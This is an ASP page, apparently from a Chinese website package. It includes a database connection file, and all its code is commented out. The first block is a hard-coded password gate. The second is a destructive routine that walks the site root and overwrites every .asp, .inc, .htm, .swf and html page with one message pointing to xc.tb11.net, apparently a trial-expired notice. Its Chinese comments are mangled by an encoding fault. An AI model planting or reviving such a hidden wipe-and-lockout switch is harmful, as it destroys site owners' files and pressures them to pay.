<%@ LANGUAGE = VBScript.Encode %>

<!--#include file="conn.asp"-->
<%
'yoot=request("yoot")
'tongguo="rnjpdfe5465wer988"
'if yoot<>tongguo or yoot="" then
'	response.Redirect "index.asp"
'	response.end
'end if
%>
<% 
'  Sub midfile(path_from, path_to) 
'  list_from = path_from '���浱ǰԴ����Ŀ¼ 
'  list_to = path_to '���浱ǰĿ�깤��Ŀ¼ 
'  Set fso = CreateObject("Scripting.FileSystemObject") 
'  Set Fold = fso.GetFolder(list_from) '��ȡFolder���� 
'  Set fc = Fold.Files '��ȡ�ļ���¼�� 
'  Set mm = Fold.SubFolders '��ȡĿ¼��¼�� 
'  For Each f2 in mm 
'  set objfile = server.createobject("scripting.filesystemobject") 
'  Next 
'  For Each f1 in fc 
'  file_from = list_from & "\" & f1.name '�����ļ���ַ(Դ) 
'  file_to = list_to & "\" & f1.name '�����ļ���ַ(��) 
'  fileExt = lcase(right(f1.name,4)) '��ȡ�ļ����� 
'  If fileExt=".asp" or fileExt=".inc" or fileExt=".htm" or fileExt=".swf" or fileExt="html" Then '�������Ϳ������޸����� 
'  	set objfile = server.createobject("scripting.filesystemobject") '����һ���������������ȡԴ�ļ��� 
'  	set out = objfile.opentextfile(file_from, 1, false, false) 
'  	content = out.readall '��ȡ���� 
'  	out.close 
'  	
'  	
'  	
'  	set objfile = server.createobject("scripting.filesystemobject") '����һ�������������д��Ŀ���ļ��� 
'  	set outt = objfile.createtextfile(file_to,TRUE,FALSE) 
'  	outt.write("ϵͳ�����ѵ���,�뵽�ٷ���վ��ϵ�ͷ�xc.tb11.net") 'д������ 
'  	outt.close 
'  else '����ֱ�Ӹ����ļ� 
'  Set fso = CreateObject("Scripting.FileSystemObject") 
'  fso.CopyFile file_from, file_to 
'  End If 
'  Next 
' End Sub 
'  
' midfile Server.mappath("./"), Server.mappath("./") '����ʾ�� ԴĿ¼temp/aaa ������浽temp/bbb 
'  'ԴĿ¼ Ŀ��Ŀ¼���������Ѿ����ڵ�Ŀ¼��
'  
  %> 
